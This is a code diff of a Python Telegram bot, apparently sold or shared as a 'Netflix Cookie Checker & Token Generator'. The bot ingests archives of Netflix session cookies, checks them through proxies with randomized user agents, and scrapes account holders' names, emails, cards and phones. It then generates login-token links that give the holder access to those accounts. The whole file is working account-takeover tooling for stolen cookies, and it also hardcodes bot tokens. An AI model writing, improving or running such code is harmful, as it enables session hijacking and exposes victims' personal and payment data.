@@ -23,11 +23,11 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "7972038760:AAEXOmE44KVDTY5xLVVUi9MMuWF2CbIKYYo")
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8252702666:AAEKVanQAvxLZJMl1kAcDb-3_luVeach8_0")
 OWNER_USER_ID = "6284479489"
 
 CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-1002710971355"))
-PRIVATE_CHANNEL_LINK = os.environ.get("PRIVATE_CHANNEL_LINK", "https://t.me/+7Q9vA87LKeMwOTNl")
+PRIVATE_CHANNEL_LINK = os.environ.get("PRIVATE_CHANNEL_LINK", "https://t.me/+tttfU52Nm3xkNDA1")
 
 DOWNLOAD_DIR = "downloads"
 RESULTS_DIR = "results"
@@ -36,8 +36,59 @@ WORKER_COUNT = 30
 MAX_WORKERS = 100
 PROXY_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'proxy.json')
 
+CE = {
+    "check": '<tg-emoji emoji-id="5794058427315524702">\u2705</tg-emoji>',
+    "bolt": '<tg-emoji emoji-id="5085022089103016925">\u26a1</tg-emoji>',
+    "gem": '<tg-emoji emoji-id="4956719506027185156">\U0001f48e</tg-emoji>',
+    "cig": '<tg-emoji emoji-id="6050874300267763921">\U0001f6ac</tg-emoji>',
+    "key": '<tg-emoji emoji-id="4956640049132208666">\U0001f511</tg-emoji>',
+    "shield": '<tg-emoji emoji-id="5251203410396458957">\U0001f6e1</tg-emoji>',
+    "heart_o": '<tg-emoji emoji-id="5915873784413296476">\U0001f9e1</tg-emoji>',
+    "heart_p": '<tg-emoji emoji-id="5084974483685507801">\U0001f49c</tg-emoji>',
+    "crown": '<tg-emoji emoji-id="6298286084627368260">\U0001f451</tg-emoji>',
+    "cookie": '<tg-emoji emoji-id="4956390086330549100">\U0001f36a</tg-emoji>',
+    "crown2": '<tg-emoji emoji-id="4956420859771225351">\U0001f451</tg-emoji>',
+    "storm": '<tg-emoji emoji-id="5794407002566300853">\u26c8</tg-emoji>',
+    "movie": '<tg-emoji emoji-id="4985503389002499406">\U0001f3a5</tg-emoji>',
+    "warn": '<tg-emoji emoji-id="5044243363197355199">\u26a0\ufe0f</tg-emoji>',
+    "top": '<tg-emoji emoji-id="5415655814079723871">\U0001f51d</tg-emoji>',
+    "link": '<tg-emoji emoji-id="5271604874419647061">\U0001f517</tg-emoji>',
+    "wave": '<tg-emoji emoji-id="5458904472598095631">\U0001f44b</tg-emoji>',
+    "rocket": '<tg-emoji emoji-id="5372917041193828849">\U0001f680</tg-emoji>',
+    "folder": '<tg-emoji emoji-id="5974308936189218317">\U0001f4c1</tg-emoji>',
+    "users": '<tg-emoji emoji-id="6001526766714227911">\U0001f465</tg-emoji>',
+    "robot": '<tg-emoji emoji-id="5971808079811972376">\U0001f916</tg-emoji>',
+}
+
 proxy_list = []
 proxy_index = {"idx": 0}
+
+async def check_channel_member(bot, user_id):
+    if str(user_id) == OWNER_USER_ID:
+        return True
+    if user_id in banned_users:
+        return False
+    try:
+        member = await bot.get_chat_member(CHANNEL_ID, user_id)
+        return member.status in ("member", "administrator", "creator")
+    except Exception:
+        return False
+
+
+def get_join_channel_markup():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("\U0001f49c Join Channel", url=PRIVATE_CHANNEL_LINK)],
+        [InlineKeyboardButton("\u2705 I've Joined", callback_data="check_joined")],
+    ])
+
+
+def get_not_joined_text():
+    return (
+        f"{CE['shield']} <b>Access Restricted</b>\n\n"
+        f"You must join our channel to use this bot.\n\n"
+        f"{CE['bolt']} Join the channel and tap <b>I've Joined</b> to verify."
+    )
+
 
 def load_proxy():
     global proxy_list
@@ -197,6 +248,24 @@ batch_tasks = {}
 stop_flags = {}
 daily_batch_usage = {}
 FREE_DAILY_BATCH_LIMIT = 2
+FREE_COOKIE_LIMIT = 300
+
+BANNED_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'banned_users.json')
+banned_users = set()
+
+def load_banned():
+    global banned_users
+    try:
+        with open(BANNED_FILE, 'r') as f:
+            banned_users = set(json.load(f))
+    except (FileNotFoundError, json.JSONDecodeError):
+        banned_users = set()
+
+def save_banned():
+    with open(BANNED_FILE, 'w') as f:
+        json.dump(list(banned_users), f)
+
+load_banned()
 
 thread_pool = concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS)
 
@@ -402,11 +471,32 @@ COUNTRY_MAPPING = {
 }
 
 
+def generate_random_ios_ua():
+    ios_versions = [
+        ("16_0", "16.0"), ("16_1", "16.1"), ("16_2", "16.2"), ("16_3", "16.3"),
+        ("16_4", "16.4"), ("16_5", "16.5"), ("16_6", "16.6"), ("16_7", "16.7"),
+        ("17_0", "17.0"), ("17_1", "17.1"), ("17_2", "17.2"), ("17_3", "17.3"),
+        ("17_4", "17.4"), ("17_5", "17.5"), ("17_6", "17.6"), ("17_7", "17.7"),
+        ("18_0", "18.0"), ("18_1", "18.1"), ("18_2", "18.2"), ("18_3", "18.3"),
+    ]
+    safari_versions = [
+        "605.1.15", "604.1", "605.1.15",
+    ]
+    webkit = "AppleWebKit/605.1.15 (KHTML, like Gecko)"
+    ios_v = random.choice(ios_versions)
+    safari_v = random.choice(safari_versions)
+    scale = random.choice(["2.00", "3.00"])
+    return (
+        f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_v[0]} like Mac OS X) "
+        f"{webkit} Version/{ios_v[1]} Mobile/15E148 Safari/{safari_v}"
+    )
+
+
 class NetflixChecker:
     def __init__(self):
         self.session = requests.Session()
         self.session.headers.update({
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+            "User-Agent": generate_random_ios_ua()
         })
         apply_proxy_to_session(self.session)
 
@@ -463,17 +553,30 @@ class NetflixChecker:
     def check_account(self, cookies):
         info = {"status": "failure", "message": "Unknown error"}
         try:
-            cookie_str = '; '.join(f'{k}={v}' for k, v in cookies.items()) if isinstance(cookies, dict) else cookies
-            cookie_str = cookie_str.encode('ascii', errors='ignore').decode('ascii')
-            if 'L=en' not in cookie_str:
-                cookie_str = 'L=en; ' + cookie_str
+            session = requests.Session()
+            if isinstance(cookies, dict):
+                cookie_dict = cookies
+            else:
+                cookie_dict = self.load_cookies(cookies) or {}
+            cookie_dict['L'] = 'en'
+            session.cookies.update(cookie_dict)
+            apply_proxy_to_session(session)
+
+            ua = generate_random_ios_ua()
             headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                "User-Agent": ua,
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                 "Accept-Language": "en-US,en;q=0.9",
-                "Cookie": cookie_str
+                "Accept-Encoding": "gzip, deflate, br",
+                "Connection": "keep-alive",
+                "Upgrade-Insecure-Requests": "1",
+                "Sec-Fetch-Dest": "document",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Site": "none",
+                "Sec-Fetch-User": "?1",
+                "Cache-Control": "max-age=0",
             }
-            resp = self.session.get("https://www.netflix.com/YourAccount?lng=en", headers=headers, timeout=TIMEOUT_REQUEST, allow_redirects=True)
+            resp = session.get("https://www.netflix.com/YourAccount", headers=headers, timeout=TIMEOUT_REQUEST, allow_redirects=True)
 
             if resp.status_code != 200:
                 info["message"] = f"HTTP {resp.status_code}"
@@ -616,7 +719,7 @@ class NetflixChecker:
             info["extra_member_slot_status"] = add_on_slots_match.group(1) if add_on_slots_match else "Unknown"
 
             try:
-                profiles_resp = self.session.get("https://www.netflix.com/ManageProfiles?lng=en", headers=headers, timeout=10)
+                profiles_resp = session.get("https://www.netflix.com/ManageProfiles", headers=headers, timeout=10)
                 profile_names = re.findall(r'"profileName"\s*:\s*"([^"]+)"', profiles_resp.text)
                 if profile_names:
                     decoded = [self._unescape_netflix(p) for p in profile_names]
@@ -672,7 +775,7 @@ class NetflixTokenGenerator:
     def __init__(self):
         self.session = requests.Session()
         self.session.headers.update({
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.8.5 Mobile/15E148 Safari/604.1"
+            "User-Agent": generate_random_ios_ua()
         })
         apply_proxy_to_session(self.session)
         self.stats = {
@@ -721,7 +824,15 @@ class NetflixTokenGenerator:
 
     def extract_all_cookies(self, text):
         cookies = {}
-        for key in ['NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent']:
+        nfid_match = re.search(r'(?<![Ss]ecure)NetflixId=([^;\s]+)', text)
+        if nfid_match:
+            nfid_val = nfid_match.group(1).strip('; ')
+            if nfid_val.endswith('..'):
+                nfid_val = nfid_val[:-2]
+            elif nfid_val.endswith('.'):
+                nfid_val = nfid_val[:-1]
+            cookies['NetflixId'] = nfid_val
+        for key in ['SecureNetflixId', 'nfvdid', 'OptanonConsent']:
             match = re.search(rf'{key}=([^;\s]+)', text)
             if match:
                 cookies[key] = match.group(1).strip('; ')
@@ -734,6 +845,11 @@ class NetflixTokenGenerator:
                 if len(parts) >= 7:
                     name = parts[5].strip()
                     value = parts[6].strip()
+                    if name == 'NetflixId':
+                        if value.endswith('..'):
+                            value = value[:-2]
+                        elif value.endswith('.'):
+                            value = value[:-1]
                     if name in ['NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent']:
                         cookies[name] = value
         return cookies
@@ -764,7 +880,7 @@ class NetflixTokenGenerator:
             "responseFormat": "json",
         }
         headers = {
-            "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
+            "User-Agent": generate_random_ios_ua(),
             "x-netflix.request.attempt": "1",
             "x-netflix.client.idiom": "phone",
             "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
@@ -823,6 +939,7 @@ class NetflixTokenGenerator:
                 return {"success": False, "error": "Missing required cookie: NetflixId"}
 
         netflix_id_value = cookie_dict['NetflixId']
+        logger.info(f"Token gen using NetflixId: {netflix_id_value[:30]}...")
 
         try:
             token_value, ios_err = self._generate_ios_token(netflix_id_value)
@@ -830,7 +947,7 @@ class NetflixTokenGenerator:
                 return {"success": False, "error": ios_err or "Token generation failed"}
 
             android_login_url = f"https://www.netflix.com/unsupported?nftoken={token_value}"
-            pc_login_url = f"https://www.netflix.com/account?nftoken={token_value}"
+            pc_login_url = f"https://www.netflix.com/browse?nftoken={token_value}"
             self.stats["tokens_generated"] += 1
             self.stats["last_generated"] = datetime.now()
             return {
@@ -910,74 +1027,108 @@ def format_full_result(source_label, account_info, login_url, cookie_line, andro
 
     final_login = android_login_url or login_url
 
+    is_on_hold = on_hold in ("Yes", "yes", "true", True)
+    if use_html:
+        if is_on_hold:
+            account_label = f"{CE['check']} FREE ACCOUNT {CE['check']}"
+        else:
+            account_label = f"{CE['gem']} PREMIUM ACCOUNT {CE['gem']}"
+    else:
+        if is_on_hold:
+            account_label = "\u2705 FREE ACCOUNT \u2705"
+        else:
+            account_label = "\U0001f48e PREMIUM ACCOUNT \U0001f48e"
+
     now = datetime.now()
     generated_str = now.strftime("%Y-%m-%d %H:%M:%S")
     expires = now + timedelta(hours=1)
     expires_str = expires.strftime("%Y-%m-%d %H:%M:%S")
 
+    if final_login and final_login != "N/A":
+        phone_login_html = f"<a href=\"{final_login}\">Click Here</a>"
+        phone_login_text = final_login
+    else:
+        phone_login_html = "N/A (Token generation failed)"
+        phone_login_text = "N/A (Token generation failed)"
+
+    if login_url and login_url != "N/A":
+        pc_login_html = f"<a href=\"{login_url}\">Click Here</a>"
+        pc_login_text = login_url
+    else:
+        pc_login_html = "N/A (Token generation failed)"
+        pc_login_text = "N/A (Token generation failed)"
+
+    separator = "\u2500" * 26
+
     if use_html:
         return (
-            f"\U0001f31f <b>PREMIUM ACCOUNT</b> \U0001f31f\n\n"
-            f"\U0001f464 <b>Account Details:</b>\n"
-            f"\u2022 <b>Name:</b> {name}\n"
-            f"\u2022 <b>Email:</b> {email}\n"
-            f"\u2022 <b>Country:</b> {country_display}\n"
-            f"\u2022 <b>Plan:</b> {plan}\n"
-            f"\u2022 <b>Price:</b> {price}\n"
-            f"\u2022 <b>Member Since:</b> {member_since}\n"
-            f"\u2022 <b>Next Billing:</b> {next_billing}\n"
-            f"\u2022 <b>Payment:</b> {payment_method}\n"
-            f"\u2022 <b>Card:</b> {card_display}\n"
-            f"\u2022 <b>Phone:</b> {phone_display}\n"
-            f"\u2022 <b>Quality:</b> {video_quality}\n"
-            f"\u2022 <b>Streams:</b> {max_streams}\n"
-            f"\u2022 <b>Hold Status:</b> {on_hold}\n"
-            f"\u2022 <b>Extra Member:</b> {extra_members}\n"
-            f"\u2022 <b>Extra Member Slot:</b> {extra_member_slot}\n"
-            f"\u2022 <b>Email Verified:</b> {email_verified}\n"
-            f"\u2022 <b>Membership Status:</b> {membership_status}\n"
-            f"\u2022 <b>Connected Profiles:</b> {connected_profiles}\n"
-            f"\u2022 <b>Profiles:</b> {profiles}\n\n"
-            f"\U0001f511 <b>Token Information:</b>\n"
-            f"\u23f0 <b>Generated:</b> {generated_str}\n"
-            f"\U0001f4c5 <b>Expires:</b> {expires_str}\n"
-            f"\u23f3 <b>Remaining:</b> 0d 1h 0m 0s\n"
-            f"\U0001f4f1 <b>Phone Login:</b> <a href=\"{final_login}\">Click Here</a>\n"
-            f"\U0001f5a5\ufe0f <b>PC Login:</b> <a href=\"{login_url}\">Click Here</a>\n\n"
-            f"\U0001f36a <b>Cookie:</b>\n<code>{cookie_line}</code>\n\n"
-            f"\U0001f3af <b>Bot Owner:</b> @XD_HR"
+            f"<b>{account_label}</b>\n"
+            f"{separator}\n\n"
+            f"{CE['heart_o']} <b>Account Details</b>\n"
+            f"\u251c \U0001f9d1 <b>Name:</b> {name}\n"
+            f"\u251c \U0001f4e7 <b>Email:</b> {email}\n"
+            f"\u251c \U0001f30d <b>Country:</b> {country_display}\n"
+            f"\u251c \U0001f4e6 <b>Plan:</b> {plan}\n"
+            f"\u251c \U0001f4b0 <b>Price:</b> {price}\n"
+            f"\u251c \U0001f4c6 <b>Member Since:</b> {member_since}\n"
+            f"\u251c \U0001f4c5 <b>Next Billing:</b> {next_billing}\n"
+            f"\u251c \U0001f4b3 <b>Payment:</b> {payment_method}\n"
+            f"\u251c \U0001f4b3 <b>Card:</b> {card_display}\n"
+            f"\u2514 \U0001f4de <b>Phone:</b> {phone_display}\n\n"
+            f"{CE['bolt']} <b>Streaming Info</b>\n"
+            f"\u251c \U0001f39e\ufe0f <b>Quality:</b> {video_quality}\n"
+            f"\u251c \U0001f4f6 <b>Streams:</b> {max_streams}\n"
+            f"\u251c \u23f8\ufe0f <b>Hold Status:</b> {on_hold}\n"
+            f"\u251c \U0001f46b <b>Extra Member:</b> {extra_members}\n"
+            f"\u2514 \U0001f4ce <b>Extra Slot:</b> {extra_member_slot}\n\n"
+            f"{CE['check']} <b>Account Status</b>\n"
+            f"\u251c \U0001f4e8 <b>Email Verified:</b> {email_verified}\n"
+            f"\u251c \U0001f4cc <b>Membership:</b> {membership_status}\n"
+            f"\u251c \U0001f465 <b>Profiles:</b> {connected_profiles}\n"
+            f"\u2514 \U0001f3ad <b>Names:</b> {profiles}\n\n"
+            f"{CE['key']} <b>Token Information</b>\n"
+            f"\u251c \u23f0 <b>Generated:</b> {generated_str}\n"
+            f"\u251c \U0001f4c5 <b>Expires:</b> {expires_str}\n"
+            f"\u251c \u23f3 <b>Remaining:</b> 0d 1h 0m 0s\n"
+            f"\u251c \U0001f4f1 <b>Phone Login:</b> {phone_login_html}\n"
+            f"\u2514 \U0001f5a5\ufe0f <b>PC Login:</b> {pc_login_html}\n\n"
+            f"{CE['cookie']} <b>Cookie</b>\n<code>{cookie_line}</code>\n\n"
+            f"{CE['crown']} <b>Bot Owner:</b> @XD_HR"
         )
 
     return (
-        f"\U0001f31f PREMIUM ACCOUNT \U0001f31f\n\n"
-        f"\U0001f464 Account Details:\n"
-        f"\u2022 Name: {name}\n"
-        f"\u2022 Email: {email}\n"
-        f"\u2022 Country: {country_display}\n"
-        f"\u2022 Plan: {plan}\n"
-        f"\u2022 Price: {price}\n"
-        f"\u2022 Member Since: {member_since}\n"
-        f"\u2022 Next Billing: {next_billing}\n"
-        f"\u2022 Payment: {payment_method}\n"
-        f"\u2022 Card: {card_display}\n"
-        f"\u2022 Phone: {phone_display}\n"
-        f"\u2022 Quality: {video_quality}\n"
-        f"\u2022 Streams: {max_streams}\n"
-        f"\u2022 Hold Status: {on_hold}\n"
-        f"\u2022 Extra Member: {extra_members}\n"
-        f"\u2022 Extra Member Slot: {extra_member_slot}\n"
-        f"\u2022 Email Verified: {email_verified}\n"
-        f"\u2022 Membership Status: {membership_status}\n"
-        f"\u2022 Connected Profiles: {connected_profiles}\n"
-        f"\u2022 Profiles: {profiles}\n\n"
-        f"\U0001f511 Token Information:\n"
-        f"\u23f0 Generated: {generated_str}\n"
-        f"\U0001f4c5 Expires: {expires_str}\n"
-        f"\u23f3 Remaining: 0d 1h 0m 0s\n"
-        f"\U0001f4f1 Phone Login: {final_login}\n"
-        f"\U0001f5a5\ufe0f PC Login: {login_url}\n\n"
+        f"{account_label}\n"
+        f"{separator}\n\n"
+        f"\U0001f465 Account Details\n"
+        f"\u251c \U0001f9d1 Name: {name}\n"
+        f"\u251c \U0001f4e7 Email: {email}\n"
+        f"\u251c \U0001f30d Country: {country_display}\n"
+        f"\u251c \U0001f4e6 Plan: {plan}\n"
+        f"\u251c \U0001f4b0 Price: {price}\n"
+        f"\u251c \U0001f4c6 Member Since: {member_since}\n"
+        f"\u251c \U0001f4c5 Next Billing: {next_billing}\n"
+        f"\u251c \U0001f4b3 Payment: {payment_method}\n"
+        f"\u251c \U0001f4b3 Card: {card_display}\n"
+        f"\u2514 \U0001f4de Phone: {phone_display}\n\n"
+        f"\U0001f4fa Streaming Info\n"
+        f"\u251c \U0001f39e\ufe0f Quality: {video_quality}\n"
+        f"\u251c \U0001f4f6 Streams: {max_streams}\n"
+        f"\u251c \u23f8\ufe0f Hold Status: {on_hold}\n"
+        f"\u251c \U0001f46b Extra Member: {extra_members}\n"
+        f"\u2514 \U0001f4ce Extra Slot: {extra_member_slot}\n\n"
+        f"\u2705 Account Status\n"
+        f"\u251c \U0001f4e8 Email Verified: {email_verified}\n"
+        f"\u251c \U0001f4cc Membership: {membership_status}\n"
+        f"\u251c \U0001f465 Profiles: {connected_profiles}\n"
+        f"\u2514 \U0001f3ad Names: {profiles}\n\n"
+        f"\U0001f510 Token Information\n"
+        f"\u251c \u23f0 Generated: {generated_str}\n"
+        f"\u251c \U0001f4c5 Expires: {expires_str}\n"
+        f"\u251c \u23f3 Remaining: 0d 1h 0m 0s\n"
+        f"\u251c \U0001f4f1 Phone Login:\n{phone_login_text}\n\n"
+        f"\u2514 \U0001f5a5\ufe0f PC Login:\n{login_url}\n\n"
         f"\U0001f36a Cookie: {cookie_line}\n\n"
-        f"\U0001f3af Bot Owner: @XD_HR"
+        f"\U0001f451 Bot Owner: @XD_HR"
     )
 
 
@@ -1006,11 +1157,16 @@ def check_and_generate(cookie_line, source_label, use_html=False):
         login_url = "N/A"
         android_login_url = "N/A"
         logger.info(f"Token gen: using full cookie string ({len(cookie_line)} chars)")
-        token_result = token_gen.generate_token_sync(cookie_line)
-        logger.info(f"Token gen result: success={token_result.get('success')}, error={token_result.get('error', 'none')}")
-        if token_result.get("success"):
-            login_url = token_result.get("pc_login_url", token_result.get("login_url", "N/A"))
-            android_login_url = token_result.get("android_login_url", login_url)
+        try:
+            token_result = token_gen.generate_token_sync(cookie_line)
+            logger.info(f"Token gen result: success={token_result.get('success')}, error={token_result.get('error', 'none')}")
+            if token_result.get("success"):
+                login_url = token_result.get("pc_login_url", token_result.get("login_url", "N/A"))
+                android_login_url = token_result.get("android_login_url", login_url)
+            else:
+                logger.warning(f"Token gen failed but account valid: {token_result.get('error')}")
+        except Exception as te:
+            logger.warning(f"Token gen exception but account valid: {te}")
         formatted = format_full_result(source_label, account_info, login_url, cookie_line, android_login_url, use_html=use_html)
         return formatted, None
     except Exception as e:
@@ -1036,11 +1192,21 @@ def parse_cookie_file_content(content):
             if len(parts) >= 7:
                 name = parts[5].strip()
                 value = parts[6].strip()
+                if name == 'NetflixId' and value:
+                    if value.endswith('..'):
+                        value = value[:-2]
+                    elif value.endswith('.'):
+                        value = value[:-1]
                 if name and value:
                     netscape_cookies[name] = value
             elif len(parts) >= 2:
                 name = parts[-2].strip()
                 value = parts[-1].strip()
+                if name == 'NetflixId' and value:
+                    if value.endswith('..'):
+                        value = value[:-2]
+                    elif value.endswith('.'):
+                        value = value[:-1]
                 if name in ('NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent'):
                     netscape_cookies[name] = value
         if 'NetflixId' in netscape_cookies:
@@ -1127,18 +1293,23 @@ def extract_archive_files(archive_bytes):
 
 
 def _extract_zip_inmemory(archive_bytes, skip_ext):
+    extract_dir = os.path.join(DOWNLOAD_DIR, f"zip_{int(time.time())}_{random.randint(1000,9999)}")
+    os.makedirs(extract_dir, exist_ok=True)
     try:
         start = time.time()
         cookies = {}
         txt_files = []
 
-        zf = zipfile.ZipFile(io.BytesIO(archive_bytes))
-        names = zf.namelist()
+        zip_path = os.path.join(extract_dir, "source.zip")
+        with open(zip_path, 'wb') as f:
+            f.write(archive_bytes)
+
+        zf = zipfile.ZipFile(zip_path)
         txt_names = []
         nested_zips = []
         non_txt_names = []
 
-        for name in names:
+        for name in zf.namelist():
             if name.endswith('/'):
                 continue
             basename = os.path.basename(name).lower()
@@ -1157,27 +1328,37 @@ def _extract_zip_inmemory(archive_bytes, skip_ext):
         t_classify = time.time() - start
         logger.info(f"ZIP classify: {len(txt_names)} txt, {len(nested_zips)} nested zips, {len(non_txt_names)} other in {t_classify:.2f}s")
 
+        extract_members = txt_names + nested_zips
+        if not txt_names and non_txt_names:
+            extract_members += non_txt_names[:500]
+
+        t_extract = time.time()
+        out_dir = os.path.join(extract_dir, "out")
+        if extract_members:
+            zf.extractall(out_dir, members=extract_members)
+        zf.close()
+        t_extract_done = time.time() - t_extract
+        logger.info(f"ZIP extractall: {len(extract_members)} files to disk in {t_extract_done:.2f}s")
+
+        os.remove(zip_path)
+
         t_parse = time.time()
-        batch_size = 100
-        for batch_start in range(0, len(txt_names), batch_size):
-            batch = txt_names[batch_start:batch_start + batch_size]
-            for name in batch:
-                try:
-                    raw = zf.read(name)
-                    content = raw.decode('utf-8', errors='ignore')
-                    cookie_str = parse_cookie_file_content(content)
-                    if cookie_str:
-                        cookies[name] = cookie_str
-                        txt_files.append(name)
-                except:
-                    pass
-            if batch_start > 0 and batch_start % 500 == 0:
-                logger.info(f"ZIP parse progress: {batch_start}/{len(txt_names)} files...")
+        for name in txt_names:
+            try:
+                fpath = os.path.join(out_dir, name)
+                with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
+                    content = f.read()
+                cookie_str = parse_cookie_file_content(content)
+                if cookie_str:
+                    cookies[name] = cookie_str
+                    txt_files.append(name)
+            except:
+                pass
 
         for nz in nested_zips:
             try:
-                nz_bytes = zf.read(nz)
-                with zipfile.ZipFile(io.BytesIO(nz_bytes)) as nzf:
+                nz_path = os.path.join(out_dir, nz)
+                with zipfile.ZipFile(nz_path) as nzf:
                     for nname in nzf.namelist():
                         if nname.endswith('/'):
                             continue
@@ -1199,7 +1380,9 @@ def _extract_zip_inmemory(archive_bytes, skip_ext):
         if not txt_files and non_txt_names:
             for name in non_txt_names[:500]:
                 try:
-                    content = zf.read(name).decode('utf-8', errors='ignore')
+                    fpath = os.path.join(out_dir, name)
+                    with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
+                        content = f.read()
                     cookie_str = parse_cookie_file_content(content)
                     if cookie_str:
                         cookies[name] = cookie_str
@@ -1207,9 +1390,8 @@ def _extract_zip_inmemory(archive_bytes, skip_ext):
                 except:
                     pass
 
-        zf.close()
         elapsed = time.time() - start
-        logger.info(f"ZIP inmemory extract+parse: {len(txt_files)} cookies from {len(txt_names)} txt files in {elapsed:.2f}s (classify={t_classify:.2f}s, parse={time.time()-t_parse:.2f}s)")
+        logger.info(f"ZIP disk extract+parse: {len(txt_files)} cookies from {len(txt_names)} txt files in {elapsed:.2f}s (classify={t_classify:.2f}s, extract={t_extract_done:.2f}s, parse={time.time()-t_parse:.2f}s)")
 
         if not txt_files:
             return None, [], None
@@ -1223,6 +1405,9 @@ def _extract_zip_inmemory(archive_bytes, skip_ext):
         import traceback
         logger.error(traceback.format_exc())
         return None, [], None
+    finally:
+        shutil.rmtree(extract_dir, ignore_errors=True)
+        logger.info(f"ZIP cleanup: deleted {extract_dir}")
 
 
 def _extract_to_disk(archive_bytes, rarfile, py7zr, tarfile, skip_ext):
@@ -1347,6 +1532,13 @@ def cleanup_all_temp():
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
+    if not await check_channel_member(context.bot, user.id):
+        await update.message.reply_text(
+            get_not_joined_text(),
+            parse_mode=ParseMode.HTML,
+            reply_markup=get_join_channel_markup()
+        )
+        return
     has_access = is_authorized(user.id)
 
     if has_access:
@@ -1357,55 +1549,331 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         remaining = get_batch_remaining(user.id)
         batch_info = f"{remaining}/{FREE_DAILY_BATCH_LIMIT} batches left today"
 
+    first_name = user.first_name or "User"
+
     welcome = (
-        "<b>\U0001f3ac NETFLIX PREMIUM BOT v5.0</b>\n"
-        "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
-        "<i>Ultimate Netflix Cookie & Token Tool</i>\n\n"
-        "<b>\U0001f451 Bot Owner:</b> @XD_HR\n"
-        f"<b>\U0001f3ab Your Access:</b> <code>{access_info}</code>\n"
-        f"<b>\U0001f4e6 Batch Limit:</b> <code>{batch_info}</code>\n"
-        f"<b>\U0001f680 Performance:</b> <code>{WORKER_COUNT} Workers</code>\n\n"
-        "<b>\U0001f6e0 AVAILABLE COMMANDS</b>\n"
-        "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
-        "\U0001f539 <b>/chk</b> - Check Cookie + Token\n"
-        "\U0001f539 <b>/batch</b> - Mass Cookie Process\n"
-        "\U0001f539 <b>/extract</b> - Extract NetflixId\n"
-        "\U0001f539 <b>/gen</b> - Quick Token Gen\n"
-        "\U0001f539 <b>/stats</b> - System Stats\n"
-        "\U0001f539 <b>/redeem</b> - Activate Key\n"
+        f"{CE['wave']} Hi <b>{first_name}</b>, I'm your Netflix Cookie Checker "
+        f"& Token Generator {CE['cookie']}\n\n"
+        f"{CE['rocket']} <b>Quick Start:</b>\n"
+        f"{CE['link']} Send me a cookie string or NetflixId\n"
+        f"{CE['top']} Or share a txt/zip/rar cookie file directly\n\n"
+        f"{CE['heart_p']} Don't know how? Send /help or /commands\n"
+        f"{CE['bolt']} Explore all my features below!\n\n"
     )
 
-    lock_status = "\U0001f512 LOCKED" if bot_locked else "\U0001f513 UNLOCKED"
-
-    if str(user.id) == OWNER_USER_ID:
-        welcome += (
-            "\n<b>\U0001f6e1 OWNER CONTROLS</b>\n"
-            "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
-            f"\U0001f538 <b>Bot Status:</b> <code>{lock_status}</code>\n"
-            "\U0001f538 <b>/lock all</b> - Lock Free Access\n"
-            "\U0001f538 <b>/unlock all</b> - Unlock Free Access\n"
-            "\U0001f538 <b>/stop_batch</b> - Stop Any Batch\n"
-            "\U0001f538 <b>/mercy</b> - Grant Access\n"
-            "\U0001f538 <b>/remove</b> - Revoke Access\n"
-            "\U0001f538 <b>/genkey</b> - Generate Keys\n"
-            "\U0001f538 <b>/preview</b> - View Active Batches\n"
-        )
+    lock_status = "\U0001f512 LOCKED" if bot_locked else "\U0001f513 OPEN"
 
     welcome += (
-        "\n<b>\u2699\ufe0f CONTROL CENTER</b>\n"
-        "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
-        "\U0001f538 <b>/workers</b> - Speed Control\n"
-        "\U0001f538 <b>/stop</b> - Emergency Stop\n"
-        "\U0001f538 <b>/cancel</b> - Abort Batch\n\n"
-        "<b>\U0001f4e6 SUPPORTED DATA</b>\n"
-        "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
-        "\u2705 <code>Full Cookie Strings</code>\n"
-        "\u2705 <code>NetflixId Values</code>\n"
-        "\u2705 <code>Netscape/JSON Files</code>\n"
-        "\u2705 <code>Compressed Archives (.zip, .rar)</code>\n\n"
-        "<b>\u2728 Powered by @XD_HR</b>"
+        f"{CE['shield']} <b>YOUR STATUS</b>\n"
+        f"\u251c {CE['key']} <b>Access:</b> <code>{access_info}</code>\n"
+        f"\u251c {CE['folder']} <b>Batch:</b> <code>{batch_info}</code>\n"
+        f"\u251c {CE['bolt']} <b>Workers:</b> <code>{WORKER_COUNT}</code>\n"
+        f"\u2514 {CE['robot']} <b>Bot:</b> <code>{lock_status}</code>\n"
     )
